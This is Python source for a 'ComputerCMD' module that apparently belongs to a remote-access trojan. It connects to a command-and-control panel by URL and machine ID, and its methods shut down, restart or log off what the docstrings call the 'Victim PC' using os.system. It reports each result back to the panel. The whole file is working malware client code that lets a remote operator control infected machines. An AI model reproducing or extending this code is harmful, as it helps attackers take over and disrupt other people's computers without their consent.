import os, tempfile
from HTTPSocket import HTTPSocket

class ComputerCMD:
    def __init__(self, panelURL, machineID):
        self.C = HTTPSocket(str(panelURL), str(machineID))   # Initiate HTTPSocket Class
        self.tempdir = tempfile.gettempdir()      
                    
    def shutdown(self):
        """
        When function is called, Shutdown the Victim PC
        """
        try:
            cmd = "shutdown -s -t 00"
            self.C.Log("Succ", "Shutdown Command Executed Successfully")
            self.C.Send("CleanCommands")
            os.system(cmd)
        except Exception as e:
            self.C.Send("CleanCommands")  
            print("[Error In ComputerCMD, shutdown() Function]")
            print(f"[Error] : {e}")        
            self.C.Log("Fail", "An unexpected error occurred " + str(e)) 
      
    def restart(self):
        """
        When function is called, Restart the Victim PC
        """
        try:
            cmd = "shutdown -r -t 00"
            self.C.Log("Succ", "Restart Command Executed Successfully")
            self.C.Send("CleanCommands")  
            os.system(cmd)
        except Exception as e:
            self.C.Send("CleanCommands")  
            print("[Error In ComputerCMD, restart() Function]")            
            print(f"[Error] : {e}")        
            self.C.Log("Fail", "An unexpected error occurred " + str(e)) 

    def logoff(self):
        """
        When function is called, LogOff the Victim PC
        """
        try:
            cmd = "shutdown -l"
            self.C.Log("Succ", "LogOff Command Executed Successfully")
            self.C.Send("CleanCommands")   
            os.system(cmd)
        except Exception as e:
            self.C.Send("CleanCommands")         
            print("[Error In ComputerCMD, logoff() Function]")            
            print(f"[Error] : {e}")        
            self.C.Log("Fail", "An unexpected error occurred " + str(e))           
  